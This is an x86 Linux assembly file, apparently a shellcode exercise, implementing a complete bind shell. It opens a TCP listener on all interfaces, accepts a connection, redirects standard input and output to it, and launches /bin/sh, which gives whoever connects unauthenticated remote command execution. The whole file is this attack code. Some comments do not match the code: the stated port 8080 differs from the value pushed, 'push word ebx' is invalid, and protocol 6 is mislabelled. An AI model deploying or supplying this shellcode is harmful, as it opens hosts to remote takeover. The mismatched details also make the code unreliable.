section .text

global _start

_start:

create_socket:
   ; Clearing registers
   xor ebx, ebx        ; zero out ebx
   mul ebx             ; zero out eax, and edx

   ; Setting up EAX and EBX
   mov al, 0x66        ; setting eax to the system call number (0x66)
   mov bl, 1           ; setting ebx to SYS_SOCKET (0x01)

   ; Setting up ECX
   push 0x6            ; push IPPROTO_IP (0x06) to stack
   push ebx            ; push SOCK_STREAM (0x01) to stack
   push 0x02           ; push AF_INET (0x02) to stack
   mov ecx, esp        ; move address of arguments to ecx

   ; Execute system call
   int 0x80            ; trigger system call
   mov edi, eax        ; save socket file descriptor for later

bind_socket:
   ; Setting up EAX and EBX
   xor eax, eax        ; zero out eax
   mov al, 0x66        ; setting eax to the system call number(0x66)
   inc bl              ; increase ebx to 0x02 (SYS_BIND)

   ; Setting up the SOCKADDR struct
   push edx            ; push SOCKADDR->INADDR_ANY (0x00) to the stack
   push word 0x2597    ; push SOCKADDR->PORT (8080) to the stack
   push word ebx       ; push SOCKADDR->AF_INET (0x02) to the stack
   mov ecx, esp        ; move address of SOCKADDR arguments to ecx

   ; Setting up ECX
   push 0x10           ; push length of SOCKADDR (0x10) to stack
   push ecx            ; push address of SOCKADDR to stack
   push edi            ; push address of file descriptor to stack
   mov ecx, esp        ; move the address to all arguments to ecx

   ; Execute system call
   int 0x80

start_listening:
   ; Setting up EAX and EBX
   xor eax, eax        ; zero out eax
   mov al, 0x66        ; setting eax to the system call number(0x66)
   add bl, 0x02        ; increase ebx to 0x04 (SYS_LISTEN)

   ; Setting up ECX
   push edx            ; pushing 0x00 to the stack
   push edi            ; push address of file descriptor to stack
   mov ecx, esp        ; move address of arguments into ecx

   ; Execute system call
   int 0x80

accept_connection:
   ; Setting up EAX and EBX
   xor eax, eax        ; zero out eax
   mov al, 0x66        ; setting eax to the system call number(0x66)
   inc bl              ; increase ebx to 0x05 (SYS_ACCEPT)

   ; Setting up ECX
   push edx            ; pushing 0x00 to stack
   push edx            ; pushing 0x00 to stack
   push edi            ; push address of file descriptor to stack
   mov ecx, esp        ; move address of arguments into ecx

   ; Execute system call
   int 0x80

redirect_output:
   ; Setting up EAX and EBX
   mov ebx, eax        ; Moving the output from ACCEPT() into ebx
   xor eax, eax        ; zeroing out eax

   ; Setting up ECX
   xor ecx, ecx        ; zeroing out ecx
   mov cl, 0x02        ; moving the largest file descriptor into ecx

   ; Repeatedly duplicate the file discriptor into STDIN, OUT, and ERR
   loop:
       mov al, 0x3f    ; setting eax to the system call number(0x3f)
       int 0x80        ; execute system call
       dec ecx         ; decrease ecx to obtain each file descriptor
       jns loop        ; continue until a negative number is reached

exec_commands:
   ; Clearing registers
   xor ebx, ebx        ; zero out ebx
   mul ebx             ; zero out eax, and edx

   ; Setting up EAX
   mov al, 0x0b        ; setting eax to the system call number (0x0b)

   ; Setting up EBX
   push edx            ; pushing null byte to the stack
   push 0x68732f2f     ; pushing '//sh' to stack
   push 0x6e69622f     ; pushing '/bin' to stack
   mov ebx, esp        ; moving address of argument to ebx

   ; Setting up ECX and EDX
   mov ecx, edx        ; setting ecx to null byte (that's already in
                       ; edx)

   ; Execute system call
   int 0x80
